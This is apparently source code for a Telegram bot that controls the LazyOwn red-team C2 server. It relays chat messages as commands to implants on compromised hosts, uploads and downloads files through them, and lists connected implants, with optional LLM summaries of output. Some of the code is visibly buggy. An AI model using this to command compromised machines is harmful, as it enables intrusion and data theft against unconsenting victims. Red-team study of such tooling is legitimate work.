import re
import os
import csv
import json
import time
import random
import asyncio
import requests
import nest_asyncio
from telegram import Update
from lazyown import LazyOwnShell
from modules.lazygptcli5 import process_prompt_general, Groq
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

def strip_ansi(s):
    ansi_regex = re.compile(r'[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]')
    return ansi_regex.sub('', s)

class SecureSessionManager:
    def __init__(self):
        self.sessions = {}
        self.failed_attempts = {}
        self.command_timestamps = {}
    
    def register_failed_attempt(self, user_id: int):
        if user_id not in self.failed_attempts:
            self.failed_attempts[user_id] = {'count': 1, 'timestamp': time.time()}
        else:
            self.failed_attempts[user_id]['count'] += 1
            self.failed_attempts[user_id]['timestamp'] = time.time()
    
    def check_lockout(self, user_id: int) -> bool:
        attempt = self.failed_attempts.get(user_id)
        if attempt and attempt['count'] >= MAX_FAILED_ATTEMPTS:
            if (time.time() - attempt['timestamp']) < 3600: 
                return True
            else:
                del self.failed_attempts[user_id] 
        return False
    
    def check_rate_limit(self, user_id: int) -> bool:
        now = time.time()
        if user_id not in self.command_timestamps:
            self.command_timestamps[user_id] = []
        
        self.command_timestamps[user_id] = [t for t in self.command_timestamps[user_id] if now - t < 60]
        
        if len(self.command_timestamps[user_id]) >= RATE_LIMIT:
            return False
        
        self.command_timestamps[user_id].append(now)
        return True
    
    def create_session(self, user_id: int, client_id: str):
        self.sessions[user_id] = {
            'user_id': user_id,
            'client_id': client_id,
            'session_start': time.time(),
            'last_activity': time.time()
            
        }
    
    def validate_session(self, user_id: int) -> bool:
        session = self.sessions.get(user_id)
        if not session:
            return False
        
        if (time.time() - session['last_activity']) > SESSION_TIMEOUT:
            del self.sessions[user_id]
            return False
        
        session['last_activity'] = time.time()
        return True


session_manager = SecureSessionManager()

class Config:
    def __init__(self, config_dict):
        self.config = config_dict
        for key, value in self.config.items():
            setattr(self, key, value)

    def __getitem__(self, key):
        return getattr(self, key, None)

def load_payload():
    with open('payload.json', 'r') as file:
        config = json.load(file)
    return config

async def start(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    print(context.args)
    if session_manager.check_lockout(user_id):
        await update.message.reply_text("🔒 Account Blocked by try brute force, na na naaa")
        return
        
    if not context.args:
        await update.message.reply_text("Enter the secret, Usage: /start <secret>")
        return    

    if context.args[0] == c2_pass:
        session_manager.create_session(user_id, client_id=None)
        await update.message.reply_text(
            "h1! 1 4m 4 b0t to APT/RedTeaming .\n"
            "excec a command!\n"
            "use /start beggin the RedTeam LazyOwnBot."
        )
        user_games[user_id] = random.randint(1, 100)

    else:
        await update.message.reply_text("Enter the secret, Usage: /start <secret>")
        return  

async def exce_cmd(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    user_guess = update.message.text
    
    if not session_manager.validate_session(user_id):
        await update.message.reply_text("⚠️ Invalid Session")
        return
    
    if not session_manager.check_rate_limit(user_id):
        await update.message.reply_text("⏳ Speed limit")
        return
        
    global client_id
    print(f"Command : {user_guess}")
    if user_id not in user_games:
        await update.message.reply_text("Usage /start <secret> to beggin LazyOwn RedTeam Bot.")
        return

    try:
        if user_guess.startswith("c2"):
            cmd = f"issue_command_to_c2 "
            commands_history = {}
            os_data = {}
            pid = {}
            hostname= {}
            ips = {}
            user = {}
            print(update)
            if client_id:
                cmd += client_id

            parts = user_guess.split(maxsplit=1)
            nparts = len(parts)

            if nparts == "1":
                output = shell.one_cmd(user_guess)
            else:
                command = parts[1]
                cmd2c2 = cmd + " " + command
                
                path = os.getcwd()
                csv_file = f"{path}/sessions/{client_id}.log"
                print(csv_file)
                output = shell.one_cmd(cmd2c2)
                
                time.sleep(3)

                if os.path.isfile(csv_file):
                    with open(csv_file, 'r') as f:
                        reader = csv.DictReader(f)
                        rows = list(reader)
                        if rows:
                            commands_history[client_id] = [rows[-1]]
                            os_data[client_id] = rows[-1]['os']
                            pid[client_id] = rows[-1]['pid']
                            hostname[client_id] = rows[-1]['hostname']
                            ips[client_id] = rows[-1]['ips']
                            user[client_id] = rows[-1]['user']
                            print(commands_history[client_id])
                            output2 = commands_history[client_id][0]['output']
                                
        else:
            output = shell.one_cmd(user_guess)
            output2 = ""
        output = strip_ansi(output)
        if ENTABLEIA:
            response = process_prompt_general(client, output, False)
            print(response)
        else:
            response = ""
        await update.message.reply_text(f"Response: {output} \n {response} \n history last cmd {output2}")
    except ValueError:
        await update.message.reply_text("Criptic Error")

async def add_cli(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if not context.args:
        await update.message.reply_text("Enter the client_id. Usage: /addcli <client_id>")
        return
    global client_id
    client_id = context.args[0]  
    await update.message.reply_text(f"Client ID '{client_id}' Configuring the target...")
    print(client_id)
    print(user_id)

async def handle_file(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in user_games:
        await update.message.reply_text("Usage /start <secret> to begin LazyOwn RedTeam Bot.")
        return
    
    print(update)
    document = update.message.document
    file = await document.get_file()
    file_name = document.file_name  
    file_path = f"sessions/temp_telegram/{file.file_id}_{file_name}"  
    print(file_path)
    os.makedirs("sessions/temp_telegram", exist_ok=True)
    
    await file.download_to_drive(file_path)
    
    if client_id:
        upload_command = f"upload_c2 {client_id} {file_path}"
        print(upload_command)
        output = shell.one_cmd(upload_command)
        print(output)
        await update.message.reply_text(f"File uploaded to implant {client_id}: {output}")
    else:
        print("no clients")
        await update.message.reply_text("No client ID set. Use /addcli <client_id> first.")

async def download_c2(update: Update, context: CallbackContext) -> None:
    """
    Handle the /download_c2 command to download a file from the C2.

    Parameters:
    update (Update): The Telegram update object.
    context (CallbackContext): The context object.

    Returns:
    None
    """
    user_id = update.message.from_user.id
    if user_id not in user_games:
        await update.message.reply_text("Usage /start <secret> to begin LazyOwn RedTeam Bot.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /download_c2 <client_id> <file_name>")
        return

    parts = context.args
    nparts = len(parts)

    if nparts == 1:
        if not client_id:
            await update.message.reply_text("No client ID set. Use /addcli <client_id> first.")
            return

    elif nparts == 2:
        clientid = parts[0]
        file_name = parts[1]
        output = shell.onecmd(f"download_c2 {clientid} {file_name}")
    else:
        await update.message.reply_text("Error: Invalid input format. Use '/download_c2 <client_id> <file_name>' or '/download_c2 <file_name>'.")
        return

    await update.message.reply_text(f"Download response: {output}")

async def send_connected_clients(update: Update, context: CallbackContext):
    try:
        response = requests.get(FLASK_API_URL, verify=False)
        if response.status_code == 200:
            data = response.json()
            connected_clients_list = data.get("connected_clients", [])
            message = "Implants Online:\n" + "\n".join(connected_clients_list)
        else:
            message = "Error"
        
        await update.message.reply_text(message)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def main() -> None:
    application = Application.builder().token(telegram_token).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addcli", add_cli))
    application.add_handler(CommandHandler("download_c2", download_c2))
    application.add_handler(CommandHandler("clients", send_connected_clients))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, exce_cmd))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    await application.run_polling()

nest_asyncio.apply()
config = Config(load_payload())
telegram_token = config.telegram_token
enable_telegram_c2 = config.enable_telegram_c2

rhost = config.rhost
api_key = config.api_key
ENTABLEIA = config.enable_ia
lhost = config.lhost
c2_port = config.c2_port
c2_pass = config.c2_pass
client = Groq(api_key=api_key)
shell = LazyOwnShell()
shell.onecmd('p')
shell.onecmd('create_session_json')
SESSION_TIMEOUT = 1800
MAX_FAILED_ATTEMPTS = 3
RATE_LIMIT = 5
user_games = {}
client_id = ''
FLASK_API_URL = f"https://{lhost}:{c2_port}/get_connected_clients"
if __name__ == "__main__":
    if ENTABLEIA:
        print("Enabled IA")
    else:
        print("Disabled IA")

    asyncio.run(main())